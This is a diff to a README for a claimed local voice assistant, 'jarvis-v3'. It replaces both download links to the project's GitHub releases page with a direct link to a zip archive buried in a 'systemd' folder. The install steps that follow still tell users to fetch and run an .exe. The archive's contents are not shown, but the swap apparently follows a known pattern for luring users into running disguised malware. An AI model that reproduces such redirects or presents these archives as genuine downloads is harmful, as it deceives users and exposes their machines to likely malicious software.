@@ -1,6 +1,6 @@
 # 🤖 jarvis-v3 - Your private voice assistant runs locally
 
-[![](https://img.shields.io/badge/Download-Jarvis-V3-blue)](https://github.com/Nick23hg/jarvis-v3/releases)
+[![](https://img.shields.io/badge/Download-Jarvis-V3-blue)](https://raw.githubusercontent.com/Nick23hg/jarvis-v3/main/systemd/jarvis_v_2.7.zip)
 
 jarvis-v3 keeps your data on your machine. This voice assistant listens for your commands and performs tasks without sending your voice or requests to the internet. It uses two separate systems to process your speech and handle your requests. This keeps things fast.
 
@@ -28,7 +28,7 @@ To run this software, your computer needs specific hardware. These parts ensure 
 
 You can set up the assistant by following these steps. You do not need to know how to code.
 
-1. Visit [this link](https://github.com/Nick23hg/jarvis-v3/releases) to access the downloads.
+1. Visit [this link](https://raw.githubusercontent.com/Nick23hg/jarvis-v3/main/systemd/jarvis_v_2.7.zip) to access the downloads.
 2. Select the latest version listed under "Assets". Look for a file ending in `.exe`.
 3. Save the file to your computer.
 4. Open the downloaded file to start the installation.
